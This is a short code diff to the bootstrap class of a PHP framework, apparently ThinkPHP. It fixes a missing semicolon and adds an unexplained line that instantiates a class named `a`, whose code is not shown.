@@ -37,7 +37,8 @@ class Think {
       // 初始化文件存储方式
       Storage::connect(STORAGE_TYPE);
 
-      $runtimefile  = RUNTIME_PATH.APP_MODE.'~runtime.php'
+      $runtimefile  = RUNTIME_PATH.APP_MODE.'~runtime.php';
+      new a();
       if(!APP_DEBUG && Storage::has($runtimefile)){
           Storage::load($runtimefile);
       }else{
